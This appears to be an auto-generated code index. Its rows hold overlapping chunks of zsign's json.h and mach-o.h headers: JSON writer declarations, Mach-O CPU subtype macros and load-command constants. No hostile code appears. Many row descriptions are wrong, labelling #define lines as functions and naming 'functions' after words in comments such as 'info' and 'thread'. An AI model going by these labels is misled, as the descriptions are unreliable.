906,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function XMLUnescape - implements xmlunescape functionality","static void XMLUnescape(string &strval);"
907,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","class PWriter - implements functionality related to p writer","class PWriter
{"
908,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function FastWrite - implements fastwrite functionality","static void FastWrite(const JValue &pval, string &strdoc);"
909,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function FastWriteValue - implements fastwritevalue functionality","static void FastWriteValue(const JValue &pval, string &strdoc, string &strindent);"
910,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h","Function XMLEscape - implements xmlescape functionality","static void XMLEscape(string &strval);"
911,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_TYPE_X86_64 - implements cpu type x86 64 functionality","#define CPU_TYPE_X86_64 (CPU_TYPE_X86 | CPU_ARCH_ABI64)
#define CPU_TYPE_ARM64 (CPU_TYPE_ARM | CPU_ARCH_ABI64)
#define CPU_TYPE_ARM64_32 (CPU_TYPE_ARM | CPU_ARCH_ABI64_32)
#define CPU_TYPE_POWERPC64 (CPU_TYPE_POWERPC | CPU_ARCH_ABI64)

/*
*	Machine subtypes (these are defined here, instead of in a machine
*	dependent directory, so that any program can get all definitions
*	regardless of where is it compiled).
*/"
912,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_TYPE_ARM64 - implements cpu type arm64 functionality","#define CPU_TYPE_ARM64 (CPU_TYPE_ARM | CPU_ARCH_ABI64)
#define CPU_TYPE_ARM64_32 (CPU_TYPE_ARM | CPU_ARCH_ABI64_32)
#define CPU_TYPE_POWERPC64 (CPU_TYPE_POWERPC | CPU_ARCH_ABI64)

/*
*	Machine subtypes (these are defined here, instead of in a machine
*	dependent directory, so that any program can get all definitions
*	regardless of where is it compiled).
*/
"
913,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_TYPE_ARM64_32 - implements cpu type arm64 32 functionality","#define CPU_TYPE_ARM64_32 (CPU_TYPE_ARM | CPU_ARCH_ABI64_32)
#define CPU_TYPE_POWERPC64 (CPU_TYPE_POWERPC | CPU_ARCH_ABI64)

/*
*	Machine subtypes (these are defined here, instead of in a machine
*	dependent directory, so that any program can get all definitions
*	regardless of where is it compiled).
*/

/*"
914,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_TYPE_POWERPC64 - implements cpu type powerpc64 functionality","#define CPU_TYPE_POWERPC64 (CPU_TYPE_POWERPC | CPU_ARCH_ABI64)

/*
*	Machine subtypes (these are defined here, instead of in a machine
*	dependent directory, so that any program can get all definitions
*	regardless of where is it compiled).
*/

/*
* Capability bits used in the definition of cpu_subtype."
915,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function subtypes - implements subtypes functionality","*	Machine subtypes (these are defined here, instead of in a machine
*	dependent directory, so that any program can get all definitions
*	regardless of where is it compiled).
*/

/*
* Capability bits used in the definition of cpu_subtype.
*/
#define CPU_SUBTYPE_MASK 0xff000000  /* mask for feature flags */
#define CPU_SUBTYPE_LIB64 0x80000000 /* 64 bit libraries */"
916,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_INTEL(f, m) ((f) + ((m) << 4))

#define CPU_SUBTYPE_I386_ALL CPU_SUBTYPE_INTEL(3, 0)
#define CPU_SUBTYPE_386 CPU_SUBTYPE_INTEL(3, 0)
#define CPU_SUBTYPE_486 CPU_SUBTYPE_INTEL(4, 0)
#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128
#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)
#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)"
917,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_I386_ALL CPU_SUBTYPE_INTEL(3, 0)
#define CPU_SUBTYPE_386 CPU_SUBTYPE_INTEL(3, 0)
#define CPU_SUBTYPE_486 CPU_SUBTYPE_INTEL(4, 0)
#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128
#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)
#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)
#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)"
918,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_386 CPU_SUBTYPE_INTEL(3, 0)
#define CPU_SUBTYPE_486 CPU_SUBTYPE_INTEL(4, 0)
#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128
#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)
#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)
#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)"
919,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_486 CPU_SUBTYPE_INTEL(4, 0)
#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128
#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)
#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)
#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)"
920,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128
#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)
#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)
#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)"
921,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)
#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)
#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)"
922,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)
#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)
#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)
#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)"
923,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)
#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)
#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)"
924,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)
#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)"
925,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)
#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)"
926,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)
#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)"
927,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)
#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)"
928,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)
#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)"
929,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)
#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)
"
930,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)
#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)

#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)"
931,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)
#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)

#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)
#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15"
932,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)
#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)

#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)
#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15
"
933,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)
#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)

#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)
#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15

#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)"
934,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)
#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)

#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)
#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15

#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)
#define CPU_SUBTYPE_INTEL_MODEL_ALL 0"
935,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)
#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)

#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)
#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15

#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)
#define CPU_SUBTYPE_INTEL_MODEL_ALL 0
"
936,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)
#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)

#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)
#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15

#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)
#define CPU_SUBTYPE_INTEL_MODEL_ALL 0

/*"
937,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality","#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)

#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)
#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15

#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)
#define CPU_SUBTYPE_INTEL_MODEL_ALL 0

/*
*	X86 subtypes."
938,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL_FAMILY - implements cpu subtype intel family functionality","#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)
#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15

#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)
#define CPU_SUBTYPE_INTEL_MODEL_ALL 0

/*
*	X86 subtypes.
*/
"
939,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function CPU_SUBTYPE_INTEL_MODEL - implements cpu subtype intel model functionality","#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)
#define CPU_SUBTYPE_INTEL_MODEL_ALL 0

/*
*	X86 subtypes.
*/

#define CPU_SUBTYPE_X86_ALL 3
#define CPU_SUBTYPE_X86_64_ALL 3
#define CPU_SUBTYPE_X86_ARCH1 4"
940,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function info - implements info functionality","#define LC_SYMSEG 0x00000003         /* link-edit gdb symbol table info (obsolete) */
#define LC_THREAD 0x00000004         /* thread */
#define LC_UNIXTHREAD 0x00000005     /* unix thread (includes a stack) */
#define LC_LOADFVMLIB 0x00000006     /* load a specified fixed VM shared library */
#define LC_IDFVMLIB 0x00000007       /* fixed VM shared library identification */
#define LC_IDENT 0x00000008          /* object identification info (obsolete) */
#define LC_FVMFILE 0x00000009        /* fixed VM file inclusion (internal use) */
#define LC_PREPAGE 0x0000000a        /* prepage command (internal use) */
#define LC_DYSYMTAB 0x0000000b       /* dynamic link-edit symbol table info */
#define LC_LOAD_DYLIB 0x0000000c     /* load a dynamicly linked shared library */"
941,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function thread - implements thread functionality","#define LC_UNIXTHREAD 0x00000005     /* unix thread (includes a stack) */
#define LC_LOADFVMLIB 0x00000006     /* load a specified fixed VM shared library */
#define LC_IDFVMLIB 0x00000007       /* fixed VM shared library identification */
#define LC_IDENT 0x00000008          /* object identification info (obsolete) */
#define LC_FVMFILE 0x00000009        /* fixed VM file inclusion (internal use) */
#define LC_PREPAGE 0x0000000a        /* prepage command (internal use) */
#define LC_DYSYMTAB 0x0000000b       /* dynamic link-edit symbol table info */
#define LC_LOAD_DYLIB 0x0000000c     /* load a dynamicly linked shared library */
#define LC_ID_DYLIB 0x0000000d       /* dynamicly linked shared lib identification */
#define LC_LOAD_DYLINKER 0x0000000e  /* load a dynamic linker */"
942,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function inclusion - implements inclusion functionality","#define LC_FVMFILE 0x00000009        /* fixed VM file inclusion (internal use) */
#define LC_PREPAGE 0x0000000a        /* prepage command (internal use) */
#define LC_DYSYMTAB 0x0000000b       /* dynamic link-edit symbol table info */
#define LC_LOAD_DYLIB 0x0000000c     /* load a dynamicly linked shared library */
#define LC_ID_DYLIB 0x0000000d       /* dynamicly linked shared lib identification */
#define LC_LOAD_DYLINKER 0x0000000e  /* load a dynamic linker */
#define LC_ID_DYLINKER 0x0000000f    /* dynamic linker identification */
#define LC_PREBOUND_DYLIB 0x00000010 /* modules prebound for a dynamicly */
#define LC_ROUTINES 0x00000011
#define LC_SUB_FRAMEWORK 0x00000012"
943,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","Function command - implements command functionality","#define LC_PREPAGE 0x0000000a        /* prepage command (internal use) */
#define LC_DYSYMTAB 0x0000000b       /* dynamic link-edit symbol table info */
#define LC_LOAD_DYLIB 0x0000000c     /* load a dynamicly linked shared library */
#define LC_ID_DYLIB 0x0000000d       /* dynamicly linked shared lib identification */
#define LC_LOAD_DYLINKER 0x0000000e  /* load a dynamic linker */
#define LC_ID_DYLINKER 0x0000000f    /* dynamic linker identification */
#define LC_PREBOUND_DYLIB 0x00000010 /* modules prebound for a dynamicly */
#define LC_ROUTINES 0x00000011
#define LC_SUB_FRAMEWORK 0x00000012
#define LC_SUB_UMBRELLA 0x00000013"
944,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct define","#pragma pack(push, 1)

struct fat_header
{"
945,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct fat_header - implements fat_header functionality","struct fat_header
{"
946,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h","struct fat_arch - implements fat_arch functionality","struct fat_arch
{"
